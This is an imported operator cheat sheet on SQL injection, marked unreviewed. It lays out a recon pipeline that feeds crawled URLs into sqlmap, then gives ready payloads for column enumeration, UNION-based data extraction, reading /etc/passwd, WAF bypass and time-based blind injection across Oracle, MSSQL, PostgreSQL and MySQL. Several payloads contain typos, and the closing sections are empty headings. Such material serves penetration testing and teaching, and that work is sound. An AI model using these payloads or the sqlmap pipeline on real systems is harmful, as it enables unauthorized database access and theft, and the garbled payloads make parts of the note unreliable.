---
technique: "SQLi"
family: "injection"
severity_hint: "critical"
tags: ["SQL Injection", "Remote Code Execution", "Account Takeover", "NTLM", "SQL"]
source: "_raw/Web attacks/Web Attacks/SQLi.md"
source_sha256: "a45fb840dd005747aee501ff3225d3947341373cb6e4028175c574c637cf338b"
curator_version: 2
review_status: imported-unreviewed
---

# SQLi

> Family: **injection** · Severity hint: **critical** · Tags: SQL Injection, Remote Code Execution, Account Takeover, NTLM, SQL
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: gau, httpx, sqlmap.

## Quick index — payloads & commands in this note
- `1. Capture the request using burpsuite`
- `bash: 1. sublist3r -d target | tee -a domains`
- `bash: 2. cat domains | httpx | tee -a alive`
- `1. Use subdomain enumeration tools on the domain`
- `1. Submit single quote character ' and look for errors`
- `Submit a series of ORDER BY clause such as`
- `Submit a series of UNION SELECT payloads.`
- `Oracle 			  SELECT banner FROM v$version`
- `Oracle`
- `' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())`
- `' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where`
- `' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')`
- `%00' UNION SELECT password FROM Users WHERE username-'xyz'--`
- `'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIK`
- `for example :`
- `Oracle 	      dbms_pipe.receive_message(('a'),10)`
- `Oracle`

## Playbook (operator notes)

# SQLi

[https://github.com/r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri)

[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

[https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)

[GitHub - malvads/sqlmc: Official Kali Linux tool to check all urls of a domain for SQL injections :)](https://github.com/malvads/sqlmc?tab=readme-ov-file)

[SQLMap Tamper Scripts (SQL Injection and WAF bypass)](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)

[SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

Advanced SQL Injections - cheatsheet.pdf

- Methods To Find SQL
    
    ## Using Burpsuite
    
    ```
    1. Capture the request using burpsuite
    2. Send the request to burp scanner
    3. Proceed with active scan
    4. Once the scan is finished, look for SQL vulnerability that has been detected
    5. Manually try SQL injection payloads
    6. Use SQLMAP to speed up the process
    ```
    
    ## Using waybackurls and other bunch of tools
    
    ```bash
    1. sublist3r -d target | tee -a domains 
    
    * You can use other tools like findomain, assetfinder, etc.
    ```
    
    ```bash
    2. cat domains | httpx | tee -a alive
    3. cat alive | waybackurls | tee -a urls
    4. gf sqli urls >> sqli
    5. sqlmap -m sqli --dbs --batch
    6. Use tamper scripts
    ```
    
    ## 3. Using heuristic scan to get hidden parameters :
    
    ```
    1. Use subdomain enumeration tools on the domain
    2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains
    3. You can use the same method described above in 2nd point
    4. Use Arjun to scan for the hidden params in the urls
    5. Use --urls flag to include all urls
    6. Check the params as <https://domain.com>?<hiddenparam>=<value>
    7. Send request to file and process it through sqlmap
    ```
    
    ## 4. Error generation with untrusted input or special characters :
    
    ```
    1. Submit single quote character ' and look for errors
    2. Submit SQL specific query
    3. Submit Boolean conditions such as or 1=1 and or 1=0 chekc application's response
    4. Submit certain payloads that results in time delay
    ```
    
    # Post-Methods
    
    ## Finding total number of columns
    
    ```
    Submit a series of ORDER BY clause such as
    
      ' ORDER BY 1 --
      ' ORDER BY 2 --
      ' ORDER BY 3 --
    
      and incrementing specified column index until an error occurs.
    ```
    
    ## Finding vulnerable columns with union operator
    
    ```
    Submit a series of UNION SELECT payloads.
    
      ' UNION SELECT NULL --
      ' UNION SELECT NULL, NULL --
      ' UNION SELECT NULL, NULL, NULL --
    
    Using NULL maximizes the probability that the payload will succeed
    NULL can be converted to every commonly used data type
    ```
    
    ## Extracting basic information
    
    ### 1. Database version
    
    ```
    Oracle 			  SELECT banner FROM v$version
    	       		  SELECT version FROM v$instance
    Microsoft 		SELECT @@version
    PostgreSQL 		SELECT version()
    MySQL 			  SELECT @@version
    
    ```
    
    ### 2. Database contents
    
    ```
    Oracle     
    SELECT * FROM all_tables
    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
    
    MSSQL 		
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    PostgreSQL 	  
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    MySQL         
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE
    ```
    
    ### 3. Shows version, user and database name
    
    ```
    ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
    ```
    
    ### 4. Concat all the rows of the returned results
    
    ```
    ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()
    ```
    
    ## 4. Accessing system files and advance exploitation afterward
    
    ```
    ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')
    ```
    
    ## 5. Bypassing WAF :
    
    ### 1. Using Null byte before SQL query.
    
    ```
    %00' UNION SELECT password FROM Users WHERE username-'xyz'--
    ```
    
    ### 2. Using SQL inline comment sequence.
    
    ```
    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'--
    
    ```
    
    ### 3. URL encoding
    
    ```
    for example :
    / URL encoded to %2f
    * URL encoded to %2a
    
    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.
    
    ```
    
    ### 4. Changing Cases (uppercase/lowercase)
    
    - For more step wise detailed methods, go through the link below
        - [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
    
    ### 5. Use SQLMAP tamper scripts - It helps bypass WAF/IDS/IPS.
    
    - Use Atlas. It helps suggesting tamper scripts for SQLMAP
        - [https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)
    - JHaddix post on SQLMAP tamper scripts
        - [https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)
    
    ## 6. Time Delays
    
    ```
    Oracle 	      dbms_pipe.receive_message(('a'),10)
    Microsoft 	  WAITFOR DELAY '0:0:10'
    PostgreSQL 	  SELECT pg_sleep(10)
    MySQL 	      SELECT sleep(10)
    ```
    
    ## 7. Conditional Delays
    
    ```
    Oracle 	      
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
    
    Microsoft 	  
    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
    
    PostgreSQL 	  
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
    
    MySQL 	      
    SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
    ```
    
    ---
    
    [SQL Injection.md](https://kathan19.gitbook.io/howtohunt/sqli/sql_injection)
    

Advanced SQLMap

---

### Blind Injection - MSSQL Example

**Intro to MSSQL/SQL Server**

**Blind SQL Injection**

**Time-based SQLi**

Out-of-Band DNS

### Specific to MSSQL

Remote Code Execution

**Leaking NetNTLM Hashes**

File Read

Mitigation

---

## PostgreSQL

Introduction PostgreSQL

Identifying Vulnerabilities

Advanced SQLi Techniques

## Specific to PostgreSQL

PostgreSQL-Specific Techniques

## SQLMap

Custom Tampering

## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi.md`
